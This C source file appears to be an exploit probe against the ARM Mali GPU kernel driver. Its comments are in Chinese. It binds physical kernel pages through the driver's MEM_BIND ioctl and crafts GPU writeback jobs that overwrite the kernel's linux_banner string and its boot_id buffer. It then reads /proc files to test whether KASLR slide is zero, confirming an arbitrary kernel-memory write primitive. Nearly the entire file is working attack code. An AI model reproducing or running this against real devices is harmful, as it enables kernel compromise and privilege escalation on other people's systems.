/*
 * kort_probe2.c - 双探针单点验证 (slide=0)
 *
 * 探针 A: linux_banner   VA 0xffffff8009dc0078 -> PA 0x01DC0078 (/proc/version 读)
 * 探针 B: boot_id 数据   VA 0xffffff800aa42548 -> PA 0x02A42548 (random/boot_id 读)
 *   注: sysctl_bootid(ctl_table) @ 0xffffff800aa42538, 其 .data 指向 boot_id uuid
 *       缓冲 (随机化后内容, 我们直接猜 .data 紧邻其后)。保守起见对该页
 *       两个候选偏移都试。
 *
 * 每个 BIND + 32B WB 写 + cache 冲刷 + 读 proc 对比。
 * 任一变化 => slide=0 确认, 立即打印目标地址表。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize;
    uint32_t psize; uint32_t flags;
    uint64_t backend_handle; int32_t secure_shared_fd;
} alloc_mem_s;
typedef struct { uint32_t points[3]; int32_t sync_fd; } mali_uk_fence_t;
typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12];
    uint32_t wb2_registers[12]; uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} pp_start_job_s;
typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR      1
#define FR_FLAGS            3
#define FR_CLEAR_DEPTH      4
#define FR_CLEAR_COLOR_0    6
#define FR_CLEAR_COLOR_1    7
#define FR_CLEAR_COLOR_2    8
#define FR_CLEAR_COLOR_3    9
#define FR_WIDTH           10
#define FR_HEIGHT          11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA           18
#define FR_SCALE           21
#define FR_FOUREIGHT       22
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_PITCH 5
#define WB_MRT_BITS 6

#define GPU_VA_DATA  0x40000000u
#define BUF_SIZE     0x4000

static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};
static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = 0x800,
             pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

/* 32B 窗口 WB 写 (W=0x10 H=0x4) */
static int wb_write32(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value)
{
    const uint32_t OFF_PLB = 0, OFF_SHADER = 0x80, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);
    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));
    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;
    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0; plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000; plb[4] = 0; plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;
    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x10;
    job.frame_registers[FR_HEIGHT]          = 0x4;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH]        = 16;
    job.wb0_registers[WB_MRT_BITS]     = 4;
    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;
    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    if (tio(fd, MALI_IOC_PP_START_JOB, &job, 5) != 0) return -1;
    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    if (tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5) != 0) return -2;
    if (notif.type == 0x00020010) {
        uint32_t st;
        memcpy(&st, notif.data + 8, 4);
        printf("    [job] status=0x%08x%s%s\n", st,
               (st & (1<<16)) ? " SUCCESS" : "",
               (st & (1<<21)) ? " SEG_FAULT" : "");
    }
    return 0;
}

static volatile char *g_flush = NULL;
static void flush_cpu_cache(void) {
    if (!g_flush) g_flush = mmap(NULL, 8*1024*1024, PROT_READ|PROT_WRITE,
                                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (g_flush == MAP_FAILED) { g_flush = NULL; return; }
    for (size_t i = 0; i < 8*1024*1024; i += 64) g_flush[i] = (char)(i>>6);
}

static int read_file(const char *path, char *out, int n) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int r = read(fd, out, n - 1);
    close(fd);
    if (r <= 0) { out[0] = 0; return -1; }
    out[r] = 0;
    /* 去尾部换行 */
    char *nl = strchr(out, '\n');
    if (nl) *nl = 0;
    return 0;
}

int main(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_probe2 - dual probe, slide=0 single shot\n");

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE; alloc.psize = BUF_SIZE;
    if (tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) { printf("[-] alloc\n"); return 1; }
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap\n"); return 1; }
    flush_cpu_cache();   /* 预分配+预热 */

    char v0[80], b0[80];
    read_file("/proc/version", v0, sizeof(v0));
    read_file("/proc/sys/kernel/random/boot_id", b0, sizeof(b0));
    printf("[*] version   : %s\n", v0);
    printf("[*] boot_id   : %s\n", b0);

    /* ---- 探针 A: banner 页 @ PA 0x01DC0000, 偏移 0x78 ---- */
    printf("\n[probe A] banner PA 0x01DC0078 ...\n");
    {
        const uint32_t PA_PAGE = 0x01DC0000, OFF = 0x78, VA = 0x41000000;
        if (bind_phys(fd, PA_PAGE, VA, 0x1000) == 0) {
            wb_write32(fd, (uint32_t*)buf, VA + OFF, 0x2F2F2F2F);  /* "////" */
            flush_cpu_cache();
            char v1[80];
            read_file("/proc/version", v1, sizeof(v1));
            printf("  after : %s\n", v1);
            if (strncmp(v1, "////", 4) == 0) {
                printf("  [+] *** BANNER CHANGED! slide=0 CONFIRMED ***\n");
            } else {
                printf("  [-] unchanged\n");
            }
        } else printf("  [-] bind failed\n");
    }

    /* ---- 探针 B: boot_id 数据页 @ PA 0x02A42500, 多候选偏移 ---- */
    printf("\n[probe B] boot_id data PA 0x02A42548 ...\n");
    {
        const uint32_t PA_PAGE = 0x02A42500, VA = 0x41100000;
        if (bind_phys(fd, PA_PAGE, VA, 0x1000) == 0) {
            /* 写满前 32B (覆盖 .data 指针区域也无妨, bss 页) */
            wb_write32(fd, (uint32_t*)buf, VA + 0x548, 0x58585858);
            flush_cpu_cache();
            char b1[80];
            read_file("/proc/sys/kernel/random/boot_id", b1, sizeof(b1));
            printf("  after : %s\n", b1);
            if (strncmp(b1, "XXXXXXXX-XXXX", 10) == 0) {
                printf("  [+] *** BOOT_ID CHANGED! slide=0 CONFIRMED ***\n");
            } else if (strcmp(b1, b0) != 0) {
                printf("  [+] boot_id changed (offset nearby): %s\n", b1);
            } else {
                printf("  [-] unchanged\n");
            }
        } else printf("  [-] bind failed\n");
    }

    /* ---- 探针 A2: 写到 banner 前一字节位置 (off 0x70) 再看 ---- */
    printf("\n[probe A2] banner PA 0x01DC0070 (offset calibration) ...\n");
    {
        const uint32_t PA_PAGE = 0x01DC0000, VA = 0x41200000;
        if (bind_phys(fd, PA_PAGE, VA, 0x1000) == 0) {
            wb_write32(fd, (uint32_t*)buf, VA + 0x70, 0x5A5A5A5A);  /* "ZZZZ" */
            flush_cpu_cache();
            char v2[80];
            read_file("/proc/version", v2, sizeof(v2));
            printf("  after : %.40s\n", v2);
            if (strncmp(v2, "Linux versionZZZZ", 17) == 0 || v2[0] == 'Z') {
                printf("  [+] *** BANNER CHANGED AT +0x70! window has offset ***\n");
            }
        }
    }

    printf("\n[*] done. 若均未变化 => slide!=0 或 BIND 页写入不落地, 需要顺序扫描。\n");
    munmap(buf, BUF_SIZE);
    close(fd);
    return 0;
}
